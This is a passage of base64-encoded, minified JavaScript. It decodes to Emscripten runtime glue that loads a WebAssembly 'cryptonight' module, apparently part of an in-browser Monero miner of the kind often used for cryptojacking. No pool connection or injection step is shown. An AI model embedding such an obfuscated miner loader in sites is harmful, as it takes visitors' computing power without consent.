1zdGFydElkeH1Nb2R1bGVbInN0cmluZ1RvVVRGOEFycmF5Il09c3RyaW5nVG9VVEY4QXJyYXk7ZnVuY3Rpb24gc3RyaW5nVG9VVEY4KHN0cixvdXRQdHIsbWF4Qnl0ZXNUb1dyaXRlKXtyZXR1cm4gc3RyaW5nVG9VVEY4QXJyYXkoc3RyLEhFQVBVOCxvdXRQdHIsbWF4Qnl0ZXNUb1dyaXRlKX1Nb2R1bGVbInN0cmluZ1RvVVRGOCJdPXN0cmluZ1RvVVRGODtmdW5jdGlvbiBsZW5ndGhCeXRlc1VURjgoc3RyKXt2YXIgbGVuPTA7Zm9yKHZhciBpPTA7aTxzdHIubGVuZ3RoOysraSl7dmFyIHU9c3RyLmNoYXJDb2RlQXQoaSk7aWYodT49NTUyOTYmJnU8PTU3MzQzKXU9NjU1MzYrKCh1JjEwMjMpPDwxMCl8c3RyLmNoYXJDb2RlQXQoKytpKSYxMDIzO2lmKHU8PTEyNyl7KytsZW59ZWxzZSBpZih1PD0yMDQ3KXtsZW4rPTJ9ZWxzZSBpZih1PD02NTUzNSl7bGVuKz0zfWVsc2UgaWYodTw9MjA5NzE1MSl7bGVuKz00fWVsc2UgaWYodTw9NjcxMDg4NjMpe2xlbis9NX1lbHNle2xlbis9Nn19cmV0dXJuIGxlbn1Nb2R1bGVbImxlbmd0aEJ5dGVzVVRGOCJdPWxlbmd0aEJ5dGVzVVRGODt2YXIgVVRGMTZEZWNvZGVyPXR5cGVvZiBUZXh0RGVjb2RlciE9PSJ1bmRlZmluZWQiP25ldyBUZXh0RGVjb2RlcigidXRmLTE2bGUiKTp1bmRlZmluZWQ7ZnVuY3Rpb24gZGVtYW5nbGUoZnVuYyl7dmFyIF9fY3hhX2RlbWFuZ2xlX2Z1bmM9TW9kdWxlWyJfX19jeGFfZGVtYW5nbGUiXXx8TW9kdWxlWyJfX2N4YV9kZW1hbmdsZSJdO2lmKF9fY3hhX2RlbWFuZ2xlX2Z1bmMpe3RyeXt2YXIgcz1mdW5jLnN1YnN0cigxKTt2YXIgbGVuPWxlbmd0aEJ5dGVzVVRGOChzKSsxO3ZhciBidWY9X21hbGxvYyhsZW4pO3N0cmluZ1RvVVRGOChzLGJ1ZixsZW4pO3ZhciBzdGF0dXM9X21hbGxvYyg0KTt2YXIgcmV0PV9fY3hhX2RlbWFuZ2xlX2Z1bmMoYnVmLDAsMCxzdGF0dXMpO2lmKGdldFZhbHVlKHN0YXR1cywiaTMyIik9PT0wJiZyZXQpe3JldHVybiBQb2ludGVyX3N0cmluZ2lmeShyZXQpfX1jYXRjaChlKXt9ZmluYWxseXtpZihidWYpX2ZyZWUoYnVmKTtpZihzdGF0dXMpX2ZyZWUoc3RhdHVzKTtpZihyZXQpX2ZyZWUocmV0KX1yZXR1cm4gZnVuY31SdW50aW1lLndhcm5PbmNlKCJ3YXJuaW5nOiBidWlsZCB3aXRoIC1zIERFTUFOR0xFX1NVUFBPUlQ9MSB0byBsaW5rIGluIGxpYmN4eGFiaSBkZW1hbmdsaW5nIik7cmV0dXJuIGZ1bmN9ZnVuY3Rpb24gZGVtYW5nbGVBbGwodGV4dCl7dmFyIHJlZ2V4PS9fX1pbXFx3XFxkX10rL2c7cmV0dXJuIHRleHQucmVwbGFjZShyZWdleCwoZnVuY3Rpb24oeCl7dmFyIHk9ZGVtYW5nbGUoeCk7cmV0dXJuIHg9PT15P3g6eCsiIFsiK3krIl0ifSkpfWZ1bmN0aW9uIGpzU3RhY2tUcmFjZSgpe3ZhciBlcnI9bmV3IEVycm9yO2lmKCFlcnIuc3RhY2spe3RyeXt0aHJvdyBuZXcgRXJyb3IoMCl9Y2F0Y2goZSl7ZXJyPWV9aWYoIWVyci5zdGFjayl7cmV0dXJuIihubyBzdGFjayB0cmFjZSBhdmFpbGFibGUpIn19cmV0dXJuIGVyci5zdGFjay50b1N0cmluZygpfWZ1bmN0aW9uIHN0YWNrVHJhY2UoKXt2YXIganM9anNTdGFja1RyYWNlKCk7aWYoTW9kdWxlWyJleHRyYVN0YWNrVHJhY2UiXSlqcys9IlxcbiIrTW9kdWxlWyJleHRyYVN0YWNrVHJhY2UiXSgpO3JldHVybiBkZW1hbmdsZUFsbChqcyl9TW9kdWxlWyJzdGFja1RyYWNlIl09c3RhY2tUcmFjZTt2YXIgV0FTTV9QQUdFX1NJWkU9NjU1MzY7dmFyIEFTTUpTX1BBR0VfU0laRT0xNjc3NzIxNjtmdW5jdGlvbiBhbGlnblVwKHgsbXVsdGlwbGUpe2lmKHglbXVsdGlwbGU+MCl7eCs9bXVsdGlwbGUteCVtdWx0aXBsZX1yZXR1cm4geH12YXIgSEVBUCxidWZmZXIsSEVBUDgsSEVBUFU4LEhFQVAxNixIRUFQVTE2LEhFQVAzMixIRUFQVTMyLEhFQVBGMzIsSEVBUEY2NDtmdW5jdGlvbiB1cGRhdGVHbG9iYWxCdWZmZXIoYnVmKXtNb2R1bGVbImJ1ZmZlciJdPWJ1ZmZlcj1idWZ9ZnVuY3Rpb24gdXBkYXRlR2xvYmFsQnVmZmVyVmlld3MoKXtNb2R1bGVbIkhFQVA4Il09SEVBUDg9bmV3IEludDhBcnJheShidWZmZXIpO01vZHVsZVsiSEVBUDE2Il09SEVBUDE2PW5ldyBJbnQxNkFycmF5KGJ1ZmZlcik7TW9kdWxlWyJIRUFQMzIiXT1IRUFQMzI9bmV3IEludDMyQXJyYXkoYnVmZmVyKTtNb2R1bGVbIkhFQVBVOCJdPUhFQVBVOD1uZXcgVWludDhBcnJheShidWZmZXIpO01vZHVsZVsiSEVBUFUxNiJdPUhFQVBVMTY9bmV3IFVpbnQxNkFycmF5KGJ1ZmZlcik7TW9kdWxlWyJIRUFQVTMyIl09SEVBUFUzMj1uZXcgVWludDMyQXJyYXkoYnVmZmVyKTtNb2R1bGVbIkhFQVBGMzIiXT1IRUFQRjMyPW5ldyBGbG9hdDMyQXJyYXkoYnVmZmVyKTtNb2R1bGVbIkhFQVBGNjQiXT1IRUFQRjY0PW5ldyBGbG9hdDY0QXJyYXkoYnVmZmVyKX12YXIgU1RBVElDX0JBU0UsU1RBVElDVE9QLHN0YXRpY1NlYWxlZDt2YXIgU1RBQ0tfQkFTRSxTVEFDS1RPUCxTVEFDS19NQVg7dmFyIERZTkFNSUNfQkFTRSxEWU5BTUlDVE9QX1BUUjtTVEFUSUNfQkFTRT1TVEFUSUNUT1A9U1RBQ0tfQkFTRT1TVEFDS1RPUD1TVEFDS19NQVg9RFlOQU1JQ19CQVNFPURZTkFNSUNUT1BfUFRSPTA7c3RhdGljU2VhbGVkPWZhbHNlO2Z1bmN0aW9uIGFib3J0T25DYW5ub3RHcm93TWVtb3J5KCl7YWJvcnQoIkNhbm5vdCBlbmxhcmdlIG1lbW9yeSBhcnJheXMuIEVpdGhlciAoMSkgY29tcGlsZSB3aXRoIC1zIFRPVEFMX01FTU9SWT1YIHdpdGggWCBoaWdoZXIgdGhhbiB0aGUgY3VycmVudCB2YWx1ZSAiK1RPVEFMX01FTU9SWSsiLCAoMikgY29tcGlsZSB3aXRoIC1zIEFMTE9XX01FTU9SWV9HUk9XVEg9MSB3aGljaCBhbGxvd3MgaW5jcmVhc2luZyB0aGUgc2l6ZSBhdCBydW50aW1lLCBvciAoMykgaWYgeW91IHdhbnQgbWFsbG9jIHRvIHJldHVybiBOVUxMICgwKSBpbnN0ZWFkIG9mIHRoaXMgYWJvcnQsIGNvbXBpbGUgd2l0aCAtcyBBQk9SVElOR19NQUxMT0M9MCAiKX1mdW5jdGlvbiBlbmxhcmdlTWVtb3J5KCl7YWJvcnRPbkNhbm5vdEdyb3dNZW1vcnkoKX12YXIgVE9UQUxfU1RBQ0s9TW9kdWxlWyJUT1RBTF9TVEFDSyJdfHw1MjQyODgwO3ZhciBUT1RBTF9NRU1PUlk9TW9kdWxlWyJUT1RBTF9NRU1PUlkiXXx8MTY3NzcyMTY7aWYoVE9UQUxfTUVNT1JZPFRPVEFMX1NUQUNLKU1vZHVsZS5wcmludEVycigiVE9UQUxfTUVNT1JZIHNob3VsZCBiZSBsYXJnZXIgdGhhbiBUT1RBTF9TVEFDSywgd2FzICIrVE9UQUxfTUVNT1JZKyIhIChUT1RBTF9TVEFDSz0iK1RPVEFMX1NUQUNLKyIpIik7aWYoTW9kdWxlWyJidWZmZXIiXSl7YnVmZmVyPU1vZHVsZVsiYnVmZmVyIl19ZWxzZXtpZih0eXBlb2YgV2ViQXNzZW1ibHk9PT0ib2JqZWN0IiYmdHlwZW9mIFdlYkFzc2VtYmx5Lk1lbW9yeT09PSJmdW5jdGlvbiIpe01vZHVsZVsid2FzbU1lbW9yeSJdPW5ldyBXZWJBc3NlbWJseS5NZW1vcnkoeyJpbml0aWFsIjpUT1RBTF9NRU1PUlkvV0FTTV9QQUdFX1NJWkUsIm1heGltdW0iOlRPVEFMX01FTU9SWS9XQVNNX1BBR0VfU0laRX0pO2J1ZmZlcj1Nb2R1bGVbIndhc21NZW1vcnkiXS5idWZmZXJ9ZWxzZXtidWZmZXI9bmV3IEFycmF5QnVmZmVyKFRPVEFMX01FTU9SWSl9fXVwZGF0ZUdsb2JhbEJ1ZmZlclZpZXdzKCk7ZnVuY3Rpb24gZ2V0VG90YWxNZW1vcnkoKXtyZXR1cm4gVE9UQUxfTUVNT1JZfUhFQVAzMlswXT0xNjY4NTA5MDI5O0hFQVAxNlsxXT0yNTQ1OTtpZihIRUFQVThbMl0hPT0xMTV8fEhFQVBVOFszXSE9PTk5KXRocm93IlJ1bnRpbWUgZXJyb3I6IGV4cGVjdGVkIHRoZSBzeXN0ZW0gdG8gYmUgbGl0dGxlLWVuZGlhbiEiO01vZHVsZVsiSEVBUCJdPUhFQVA7TW9kdWxlWyJidWZmZXIiXT1idWZmZXI7TW9kdWxlWyJIRUFQOCJdPUhFQVA4O01vZHVsZVsiSEVBUDE2Il09SEVBUDE2O01vZHVsZVsiSEVBUDMyIl09SEVBUDMyO01vZHVsZVsiSEVBUFU4Il09SEVBUFU4O01vZHVsZVsiSEVBUFUxNiJdPUhFQVBVMTY7TW9kdWxlWyJIRUFQVTMyIl09SEVBUFUzMjtNb2R1bGVbIkhFQVBGMzIiXT1IRUFQRjMyO01vZHVsZVsiSEVBUEY2NCJdPUhFQVBGNjQ7ZnVuY3Rpb24gY2FsbFJ1bnRpbWVDYWxsYmFja3MoY2FsbGJhY2tzKXt3aGlsZShjYWxsYmFja3MubGVuZ3RoPjApe3ZhciBjYWxsYmFjaz1jYWxsYmFja3Muc2hpZnQoKTtpZih0eXBlb2YgY2FsbGJhY2s9PSJmdW5jdGlvbiIpe2NhbGxiYWNrKCk7Y29udGludWV9dmFyIGZ1bmM9Y2FsbGJhY2suZnVuYztpZih0eXBlb2YgZnVuYz09PSJudW1iZXIiKXtpZihjYWxsYmFjay5hcmc9PT11bmRlZmluZWQpe01vZHVsZVsiZHluQ2FsbF92Il0oZnVuYyl9ZWxzZXtNb2R1bGVbImR5bkNhbGxfdmkiXShmdW5jLGNhbGxiYWNrLmFyZyl9fWVsc2V7ZnVuYyhjYWxsYmFjay5hcmc9PT11bmRlZmluZWQ/bnVsbDpjYWxsYmFjay5hcmcpfX19dmFyIF9fQVRQUkVSVU5fXz1bXTt2YXIgX19BVElOSVRfXz1bXTt2YXIgX19BVE1BSU5fXz1bXTt2YXIgX19BVEVYSVRfXz1bXTt2YXIgX19BVFBPU1RSVU5fXz1bXTt2YXIgcnVudGltZUluaXRpYWxpemVkPWZhbHNlO3ZhciBydW50aW1lRXhpdGVkPWZhbHNlO2Z1bmN0aW9uIHByZVJ1bigpe2lmKE1vZHVsZVsicHJlUnVuIl0pe2lmKHR5cGVvZiBNb2R1bGVbInByZVJ1biJdPT0iZnVuY3Rpb24iKU1vZHVsZVsicHJlUnVuIl09W01vZHVsZVsicHJlUnVuIl1dO3doaWxlKE1vZHVsZVsicHJlUnVuIl0ubGVuZ3RoKXthZGRPblByZVJ1bihNb2R1bGVbInByZVJ1biJdLnNoaWZ0KCkpfX1jYWxsUnVudGltZUNhbGxiYWNrcyhfX0FUUFJFUlVOX18pfWZ1bmN0aW9uIGVuc3VyZUluaXRSdW50aW1lKCl7aWYocnVudGltZUluaXRpYWxpemVkKXJldHVybjtydW50aW1lSW5pdGlhbGl6ZWQ9dHJ1ZTtjYWxsUnVudGltZUNhbGxiYWNrcyhfX0FUSU5JVF9fKX1mdW5jdGlvbiBwcmVNYWluKCl7Y2FsbFJ1bnRpbWVDYWxsYmFja3MoX19BVE1BSU5fXyl9ZnVuY3Rpb24gZXhpdFJ1bnRpbWUoKXtjYWxsUnVudGltZUNhbGxiYWNrcyhfX0FURVhJVF9fKTtydW50aW1lRXhpdGVkPXRydWV9ZnVuY3Rpb24gcG9zdFJ1bigpe2lmKE1vZHVsZVsicG9zdFJ1biJdKXtpZih0eXBlb2YgTW9kdWxlWyJwb3N0UnVuIl09PSJmdW5jdGlvbiIpTW9kdWxlWyJwb3N0UnVuIl09W01vZHVsZVsicG9zdFJ1biJdXTt3aGlsZShNb2R1bGVbInBvc3RSdW4iXS5sZW5ndGgpe2FkZE9uUG9zdFJ1bihNb2R1bGVbInBvc3RSdW4iXS5zaGlmdCgpKX19Y2FsbFJ1bnRpbWVDYWxsYmFja3MoX19BVFBPU1RSVU5fXyl9ZnVuY3Rpb24gYWRkT25QcmVSdW4oY2Ipe19fQVRQUkVSVU5fXy51bnNoaWZ0KGNiKX1Nb2R1bGVbImFkZE9uUHJlUnVuIl09YWRkT25QcmVSdW47ZnVuY3Rpb24gYWRkT25Jbml0KGNiKXtfX0FUSU5JVF9fLnVuc2hpZnQoY2IpfU1vZHVsZVsiYWRkT25Jbml0Il09YWRkT25Jbml0O2Z1bmN0aW9uIGFkZE9uUHJlTWFpbihjYil7X19BVE1BSU5fXy51bnNoaWZ0KGNiKX1Nb2R1bGVbImFkZE9uUHJlTWFpbiJdPWFkZE9uUHJlTWFpbjtmdW5jdGlvbiBhZGRPbkV4aXQoY2Ipe19fQVRFWElUX18udW5zaGlmdChjYil9TW9kdWxlWyJhZGRPbkV4aXQiXT1hZGRPbkV4aXQ7ZnVuY3Rpb24gYWRkT25Qb3N0UnVuKGNiKXtfX0FUUE9TVFJVTl9fLnVuc2hpZnQoY2IpfU1vZHVsZVsiYWRkT25Qb3N0UnVuIl09YWRkT25Qb3N0UnVuO2Z1bmN0aW9uIGludEFycmF5RnJvbVN0cmluZyhzdHJpbmd5LGRvbnRBZGROdWxsLGxlbmd0aCl7dmFyIGxlbj1sZW5ndGg+MD9sZW5ndGg6bGVuZ3RoQnl0ZXNVVEY4KHN0cmluZ3kpKzE7dmFyIHU4YXJyYXk9bmV3IEFycmF5KGxlbik7dmFyIG51bUJ5dGVzV3JpdHRlbj1zdHJpbmdUb1VURjhBcnJheShzdHJpbmd5LHU4YXJyYXksMCx1OGFycmF5Lmxlbmd0aCk7aWYoZG9udEFkZE51bGwpdThhcnJheS5sZW5ndGg9bnVtQnl0ZXNXcml0dGVuO3JldHVybiB1OGFycmF5fU1vZHVsZVsiaW50QXJyYXlGcm9tU3RyaW5nIl09aW50QXJyYXlGcm9tU3RyaW5nO2Z1bmN0aW9uIGludEFycmF5VG9TdHJpbmcoYXJyYXkpe3ZhciByZXQ9W107Zm9yKHZhciBpPTA7aTxhcnJheS5sZW5ndGg7aSsrKXt2YXIgY2hyPWFycmF5W2ldO2lmKGNocj4yNTUpe2NociY9MjU1fXJldC5wdXNoKFN0cmluZy5mcm9tQ2hhckNvZGUoY2hyKSl9cmV0dXJuIHJldC5qb2luKCIiKX1Nb2R1bGVbImludEFycmF5VG9TdHJpbmciXT1pbnRBcnJheVRvU3RyaW5nO2Z1bmN0aW9uIHdyaXRlU3RyaW5nVG9NZW1vcnkoc3RyaW5nLGJ1ZmZlcixkb250QWRkTnVsbCl7UnVudGltZS53YXJuT25jZSgid3JpdGVTdHJpbmdUb01lbW9yeSBpcyBkZXByZWNhdGVkIGFuZCBzaG91bGQgbm90IGJlIGNhbGxlZCEgVXNlIHN0cmluZ1RvVVRGOCgpIGluc3RlYWQhIik7dmFyIGxhc3RDaGFyLGVuZDtpZihkb250QWRkTnVsbCl7ZW5kPWJ1ZmZlcitsZW5ndGhCeXRlc1VURjgoc3RyaW5nKTtsYXN0Q2hhcj1IRUFQOFtlbmRdfXN0cmluZ1RvVVRGOChzdHJpbmcsYnVmZmVyLEluZmluaXR5KTtpZihkb250QWRkTnVsbClIRUFQOFtlbmRdPWxhc3RDaGFyfU1vZHVsZVsid3JpdGVTdHJpbmdUb01lbW9yeSJdPXdyaXRlU3RyaW5nVG9NZW1vcnk7ZnVuY3Rpb24gd3JpdGVBcnJheVRvTWVtb3J5KGFycmF5LGJ1ZmZlcil7SEVBUDguc2V0KGFycmF5LGJ1ZmZlcil9TW9kdWxlWyJ3cml0ZUFycmF5VG9NZW1vcnkiXT13cml0ZUFycmF5VG9NZW1vcnk7ZnVuY3Rpb24gd3JpdGVBc2NpaVRvTWVtb3J5KHN0cixidWZmZXIsZG9udEFkZE51bGwpe2Zvcih2YXIgaT0wO2k8c3RyLmxlbmd0aDsrK2kpe0hFQVA4W2J1ZmZlcisrPj4wXT1zdHIuY2hhckNvZGVBdChpKX1pZighZG9udEFkZE51bGwpSEVBUDhbYnVmZmVyPj4wXT0wfU1vZHVsZVsid3JpdGVBc2NpaVRvTWVtb3J5Il09d3JpdGVBc2NpaVRvTWVtb3J5O2lmKCFNYXRoWyJpbXVsIl18fE1hdGhbImltdWwiXSg0Mjk0OTY3Mjk1LDUpIT09LTUpTWF0aFsiaW11bCJdPWZ1bmN0aW9uIGltdWwoYSxiKXt2YXIgYWg9YT4+PjE2O3ZhciBhbD1hJjY1NTM1O3ZhciBiaD1iPj4+MTY7dmFyIGJsPWImNjU1MzU7cmV0dXJuIGFsKmJsKyhhaCpibCthbCpiaDw8MTYpfDB9O01hdGguaW11bD1NYXRoWyJpbXVsIl07aWYoIU1hdGhbImZyb3VuZCJdKXt2YXIgZnJvdW5kQnVmZmVyPW5ldyBGbG9hdDMyQXJyYXkoMSk7TWF0aFsiZnJvdW5kIl09KGZ1bmN0aW9uKHgpe2Zyb3VuZEJ1ZmZlclswXT14O3JldHVybiBmcm91bmRCdWZmZXJbMF19KX1NYXRoLmZyb3VuZD1NYXRoWyJmcm91bmQiXTtpZighTWF0aFsiY2x6MzIiXSlNYXRoWyJjbHozMiJdPShmdW5jdGlvbih4KXt4PXg+Pj4wO2Zvcih2YXIgaT0wO2k8MzI7aSsrKXtpZih4JjE8PDMxLWkpcmV0dXJuIGl9cmV0dXJuIDMyfSk7TWF0aC5jbHozMj1NYXRoWyJjbHozMiJdO2lmKCFNYXRoWyJ0cnVuYyJdKU1hdGhbInRydW5jIl09KGZ1bmN0aW9uKHgpe3JldHVybiB4PDA/TWF0aC5jZWlsKHgpOk1hdGguZmxvb3IoeCl9KTtNYXRoLnRydW5jPU1hdGhbInRydW5jIl07dmFyIE1hdGhfYWJzPU1hdGguYWJzO3ZhciBNYXRoX2Nvcz1NYXRoLmNvczt2YXIgTWF0aF9zaW49TWF0aC5zaW47dmFyIE1hdGhfdGFuPU1hdGgudGFuO3ZhciBNYXRoX2Fjb3M9TWF0aC5hY29zO3ZhciBNYXRoX2FzaW49TWF0aC5hc2luO3ZhciBNYXRoX2F0YW49TWF0aC5hdGFuO3ZhciBNYXRoX2F0YW4yPU1hdGguYXRhbjI7dmFyIE1hdGhfZXhwPU1hdGguZXhwO3ZhciBNYXRoX2xvZz1NYXRoLmxvZzt2YXIgTWF0aF9zcXJ0PU1hdGguc3FydDt2YXIgTWF0aF9jZWlsPU1hdGguY2VpbDt2YXIgTWF0aF9mbG9vcj1NYXRoLmZsb29yO3ZhciBNYXRoX3Bvdz1NYXRoLnBvdzt2YXIgTWF0aF9pbXVsPU1hdGguaW11bDt2YXIgTWF0aF9mcm91bmQ9TWF0aC5mcm91bmQ7dmFyIE1hdGhfcm91bmQ9TWF0aC5yb3VuZDt2YXIgTWF0aF9taW49TWF0aC5taW47dmFyIE1hdGhfY2x6MzI9TWF0aC5jbHozMjt2YXIgTWF0aF90cnVuYz1NYXRoLnRydW5jO3ZhciBydW5EZXBlbmRlbmNpZXM9MDt2YXIgcnVuRGVwZW5kZW5jeVdhdGNoZXI9bnVsbDt2YXIgZGVwZW5kZW5jaWVzRnVsZmlsbGVkPW51bGw7ZnVuY3Rpb24gZ2V0VW5pcXVlUnVuRGVwZW5kZW5jeShpZCl7cmV0dXJuIGlkfWZ1bmN0aW9uIGFkZFJ1bkRlcGVuZGVuY3koaWQpe3J1bkRlcGVuZGVuY2llcysrO2lmKE1vZHVsZVsibW9uaXRvclJ1bkRlcGVuZGVuY2llcyJdKXtNb2R1bGVbIm1vbml0b3JSdW5EZXBlbmRlbmNpZXMiXShydW5EZXBlbmRlbmNpZXMpfX1Nb2R1bGVbImFkZFJ1bkRlcGVuZGVuY3kiXT1hZGRSdW5EZXBlbmRlbmN5O2Z1bmN0aW9uIHJlbW92ZVJ1bkRlcGVuZGVuY3koaWQpe3J1bkRlcGVuZGVuY2llcy0tO2lmKE1vZHVsZVsibW9uaXRvclJ1bkRlcGVuZGVuY2llcyJdKXtNb2R1bGVbIm1vbml0b3JSdW5EZXBlbmRlbmNpZXMiXShydW5EZXBlbmRlbmNpZXMpfWlmKHJ1bkRlcGVuZGVuY2llcz09MCl7aWYocnVuRGVwZW5kZW5jeVdhdGNoZXIhPT1udWxsKXtjbGVhckludGVydmFsKHJ1bkRlcGVuZGVuY3lXYXRjaGVyKTtydW5EZXBlbmRlbmN5V2F0Y2hlcj1udWxsfWlmKGRlcGVuZGVuY2llc0Z1bGZpbGxlZCl7dmFyIGNhbGxiYWNrPWRlcGVuZGVuY2llc0Z1bGZpbGxlZDtkZXBlbmRlbmNpZXNGdWxmaWxsZWQ9bnVsbDtjYWxsYmFjaygpfX19TW9kdWxlWyJyZW1vdmVSdW5EZXBlbmRlbmN5Il09cmVtb3ZlUnVuRGVwZW5kZW5jeTtNb2R1bGVbInByZWxvYWRlZEltYWdlcyJdPXt9O01vZHVsZVsicHJlbG9hZGVkQXVkaW9zIl09e307dmFyIG1lbW9yeUluaXRpYWxpemVyPW51bGw7ZnVuY3Rpb24gaW50ZWdyYXRlV2FzbUpTKE1vZHVsZSl7dmFyIG1ldGhvZD1Nb2R1bGVbIndhc21KU01ldGhvZCJdfHwibmF0aXZlLXdhc20iO01vZHVsZVsid2FzbUpTTWV0aG9kIl09bWV0aG9kO3ZhciB3YXNtVGV4dEZpbGU9TW9kdWxlWyJ3YXNtVGV4dEZpbGUiXXx8ImNyeXB0b25pZ2h0Lndhc3QiO3ZhciB3YXNtQmluYXJ5RmlsZT1Nb2R1bGVbIndhc21CaW5hcnlGaWxlIl18fCJjLndhc20iO3ZhciBhc21qc0NvZGVGaWxlPU1vZHVsZVsiYXNtanNDb2RlRmlsZSJdfHwiY3J5cHRvbmlnaHQudGVtcC5hc20uanMiO2lmKHR5cGVvZiBNb2R1bGVbImxvY2F0ZUZpbGUiXT09PSJmdW5jdGlvbiIpe3dhc21UZXh0RmlsZT1Nb2R1bGVbImxvY2F0ZUZpbGUiXSh3YXNtVGV4dEZpbGUpO3dhc21CaW5hcnlGaWxlPU1vZHVsZVsibG9jYXRlRmlsZSJdKHdhc21CaW5hcnlGaWxlKTthc21qc0NvZGVGaWxlPU1vZHVsZVsibG9jYXRlRmlsZSJdKGFzbWpzQ29kZUZpbGUpfXZhciB3YXNtUGFnZVNpemU9NjQqMTAyNDt2YXIgYXNtMndhc21JbXBvcnRzPXsiZjY0LXJlbSI6KGZ1bmN0aW9uKHgseSl7cmV0dXJuIHgleX0pLCJmNjQtdG8taW50IjooZnVuY3Rpb24oeCl7cmV0dXJuIHh8MH0pLCJpMzJzLWRpdiI6KGZ1bmN0aW9uKHgseSl7cmV0dXJuKHh8MCkvKHl8MCl8MH0pLCJpMzJ1LWRpdiI6KGZ1bmN0aW9uKHgseSl7cmV0dXJuKHg+Pj4wKS8oeT4+PjApPj4+MH0pLCJpMzJzLXJlbSI6KGZ1bmN0aW9uKHgseSl7cmV0dXJuKHh8MCklKHl8MCl8MH0pLCJpMzJ1LXJlbSI6KGZ1bmN0aW9uKHgseSl7cmV0dXJuKHg+Pj4wKSUoeT4+PjApPj4+MH0pLCJkZWJ1Z2dlciI6KGZ1bmN0aW9uKCl7ZGVidWdnZXJ9KX07dmFyIGluZm89eyJnbG9iYWwiOm51bGwsImVudiI6bnVsbCwiYXNtMndhc20iOmFzbTJ3YXNtSW1wb3J0cywicGFyZW50IjpNb2R1bGV9O3ZhciBleHBvcnRzPW51bGw7ZnVuY3Rpb24gbG9va3VwSW1wb3J0KG1vZCxiYXNlKXt2YXIgbG9va3VwPWluZm87aWYobW9kLmluZGV4T2YoIi4iKTwwKXtsb29rdXA9KGxvb2t1cHx8e30pW21vZF19ZWxzZXt2YXIgcGFydHM9bW9kLnNwbGl0KCIuIik7bG9va3VwPShsb29rdXB8fHt9KVtwYXJ0c1swXV07bG9va3VwPShsb29rdXB8fHt9KVtwYXJ0c1sxXV19aWYoYmFzZSl7bG9va3VwPShsb29rdXB8fHt9KVtiYXNlXX1pZihsb29rdXA9PT11bmRlZmluZWQpe2Fib3J0KCJiYWQgbG9va3VwSW1wb3J0IHRvICgiK21vZCsiKS4iK2Jhc2UpfXJldHVybiBsb29rdXB9ZnVuY3Rpb24gbWVyZ2VNZW1vcnkobmV3QnVmZmVyKXt2YXIgb2xkQnVmZmVyPU1vZHVsZVsiYnVmZmVyIl07aWYobmV3QnVmZmVyLmJ5dGVMZW5ndGg8b2xkQnVmZmVyLmJ5dGVMZW5ndGgpe01vZHVsZVsicHJpbnRFcnIiXSgidGhlIG5ldyBidWZmZXIgaW4gbWVyZ2VNZW1vcnkgaXMgc21hbGxlciB0aGFuIHRoZSBwcmV2aW91cyBvbmUuIGluIG5hdGl2ZSB3YXNtLCB3ZSBzaG91bGQgZ3JvdyBtZW1vcnkgaGVyZSIpfXZhciBvbGRWaWV3PW5ldyBJbnQ4QXJyYXkob2xkQnVmZmVyKTt2YXIgbmV3Vmlldz1uZXcgSW50OEFycmF5KG5ld0J1ZmZlcik7aWYoIW1lbW9yeUluaXRpYWxpemVyKXtvbGRWaWV3LnNldChuZXdWaWV3LnN1YmFycmF5KE1vZHVsZVsiU1RBVElDX0JBU0UiXSxNb2R1bGVbIlNUQVRJQ19CQVNFIl0rTW9kdWxlWyJTVEFUSUNfQlVNUCJdKSxNb2R1bGVbIlNUQVRJQ19CQVNFIl0pfW5ld1ZpZXcuc2V0KG9sZFZpZXcpO3VwZGF0ZUdsb2JhbEJ1ZmZlcihuZXdCdWZmZXIpO3VwZGF0ZUdsb2JhbEJ1ZmZlclZpZXdzKCl9dmFyIFdhc21UeXBlcz17bm9uZTowLGkzMjoxLGk2NDoyLGYzMjozLGY2NDo0fTtmdW5jdGlvbiBmaXhJbXBvcnRzKGltcG9ydHMpe2lmKCEwKXJldHVybiBpbXBvcnRzO3ZhciByZXQ9e307Zm9yKHZhciBpIGluIGltcG9ydHMpe3ZhciBmaXhlZD1pO2lmKGZpeGVkWzBdPT0iXyIpZml4ZWQ9Zml4ZWQuc3Vic3RyKDEpO3JldFtmaXhlZF09aW1wb3J0c1tpXX1yZXR1cm4gcmV0fWZ1bmN0aW9uIGdldEJpbmFyeSgpe3RyeXt2YXIgYmluYXJ5O2lmKE1vZHVsZVsid2FzbUJpbmFyeSJdKXtiaW5hcnk9TW9kdWxlWyJ3YXNtQmluYXJ5Il07YmluYXJ5PW5ldyBVaW50OEFycmF5KGJpbmFyeSl9ZWxzZSBpZihNb2R1bGVbInJlYWRCaW5hcnkiXSl7YmluYXJ5PU1vZHVsZVsicmVhZEJpbmFyeSJdKHdhc21CaW5hcnlGaWxlKX1lbHNle3Rocm93Im9uIHRoZSB3ZWIsIHdlIG5lZWQgdGhlIHdhc20gYmluYXJ5IHRvIGJlIHByZWxvYWRlZCBhbmQgc2V0IG9uIE1vZHVsZVtcJ3dhc21CaW5hcnlcJ10uIGVtY2MucHkgd2lsbCBkbyB0aGF0IGZvciB5b3Ugd2hlbiBnZW5lcmF0aW5nIEhUTUwgKGJ1dCBub3QgSlMpIn1yZXR1cm4gYmluYXJ5fWNhdGNoKGVycil7YWJvcnQoZXJyKX19ZnVuY3Rpb24gZ2V0QmluYXJ5UHJvbWlzZSgpe2lmKCFNb2R1bGVbIndhc21CaW5hcnkiXSYmdHlwZW9mIGZldGNoPT09ImZ1bmN0aW9uIil7cmV0dXJuIGZldGNoKHdhc21CaW5hcnlGaWxlLHtjcmVkZW50aWFsczoic2FtZS1vcmlnaW4ifSkudGhlbigoZnVuY3Rpb24ocmVzcG9uc2Upe2lmKCFyZXNwb25zZVsib2siXSl7dGhyb3ciZmFpbGVkIHRvIGxvYWQgd2FzbSBiaW5hcnkgZmlsZSBhdCBcJyIrd2FzbUJpbmFyeUZpbGUrIlwnIn1yZXR1cm4gcmVzcG9uc2VbImFycmF5QnVmZmVyIl0oKX0pKX1yZXR1cm4gbmV3IFByb21pc2UoKGZ1bmN0aW9uKHJlc29sdmUscmVqZWN0KXtyZXNvbHZlKGdldEJpbmFyeSgpKX0pKX1mdW5jdGlvbiBkb05hdGl2ZVdhc20oZ2xvYmFsLGVudixwcm92aWRlZEJ1ZmZlcil7aWYodHlwZW9mIFdlYkFzc2VtYmx5IT09Im9iamVjdCIpe01vZHVsZVsicHJpbnRFcnIiXSgibm8gbmF0aXZlIHdhc20gc3VwcG9ydCBkZXRlY3RlZCIpO3JldHVybiBmYWxzZX1pZighKE1vZHVsZVsid2FzbU1lbW9yeSJdaW5zdGFuY2VvZiBXZWJBc3Nl